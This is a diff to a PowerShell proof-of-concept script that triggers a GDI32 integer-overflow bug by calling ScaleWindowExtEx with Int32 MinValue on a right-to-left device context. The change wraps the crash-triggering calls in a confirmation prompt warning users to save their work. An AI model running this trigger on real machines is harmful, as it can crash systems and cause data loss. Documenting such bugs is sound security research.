@@ -23,6 +23,7 @@
     http://blog.cmpxchg8b.com/2013/02/the-other-integer-overflow.html
     https://twitter.com/NTarakanov/status/334031968465453057
 #>
+    [CmdletBinding( ConfirmImpact = 'High')] Param ()
 
     try { $Gdi32 = [Gdi32] } catch [Management.Automation.RuntimeException]
     {
@@ -68,7 +69,10 @@
 
     $LAYOUT_RTL = 1
 
-    $DC = $Gdi32::CreateCompatibleDC([IntPtr]::Zero)
-    $Gdi32::SetLayout($DC, $LAYOUT_RTL) | Out-Null
-    $Gdi32::ScaleWindowExtEx($DC, [Int32]::MinValue, -1, 1, 1, [IntPtr]::Zero) | Out-Null
+    if ($psCmdlet.ShouldContinue( 'Do you want to continue?', 'You may want to save your work before continuing.' ))
+    {
+        $DC = $Gdi32::CreateCompatibleDC([IntPtr]::Zero)
+        $Gdi32::SetLayout($DC, $LAYOUT_RTL) | Out-Null
+        $Gdi32::ScaleWindowExtEx($DC, [Int32]::MinValue, -1, 1, 1, [IntPtr]::Zero) | Out-Null
+    }
 }
